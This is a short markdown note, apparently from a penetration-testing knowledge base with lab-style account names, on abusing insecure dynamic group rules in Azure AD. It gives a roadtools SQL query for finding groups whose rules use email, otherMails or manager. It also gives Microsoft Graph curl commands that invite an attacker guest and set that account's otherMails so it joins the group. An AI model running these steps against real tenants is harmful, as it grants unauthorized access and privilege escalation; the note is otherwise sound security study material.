---
title: Dynamic Groups
---

Users and devices are automatically added and removed from Dynamic Groups based on their properties.
Rules based on the properties *email*, *otherMails* and *manager* are insecure, because by default any user can invite a guest with a email address that matches the rule and users can edit the other two properties on their own.

You can list insecure dynamic groups and their membership rules in [[notes/tools/roadtools]].

~~~ sql
SELECT description, displayName, membershipRule  FROM Groups WHERE groupTypes LIKE '%DynamicMembership%' AND (membershipRule LIKE '%user.email%' OR membershipRule LIKE '%user.manager%' OR membershipRule LIKE '%user.otherMails%');
~~~

Invite attacker as guest into the tenant.

~~~ bash
curl -sSf 'https://graph.microsoft.com/v1.0/invitations' -H 'Content-Type: application/json' -H "Authorization: Bearer $msgraph_token" -d '{"invitedUserEmailAddress":"student57@defcorpextcontractors.onmicrosoft.com","inviteRedirectUrl":"https://example.com"}' | jq -r .inviteRedeemUrl
~~~

Login as attacker and accept the invite by opening the invite redeem URL in the browser.

As attacker add an email address to your profile that satisfies the dynamic rule.

~~~ bash
curl -sSf 'https://graph.microsoft.com/v1.0/me' -H 'Content-Type: application/json' -H "Authorization: Bearer $msgraph_token" -X PATCH -d '{"otherMails":["vendor57@defcorpextcontractors.onmicrosoft.com"]}'
curl -sSf 'https://graph.microsoft.com/v1.0/me?$select=otherMails' -H 'Content-Type: application/json' -H "Authorization: Bearer $msgraph_token" | jq
~~~

Wait 5 to 10 minutes, then the attacker user will be member of the dynamic group.
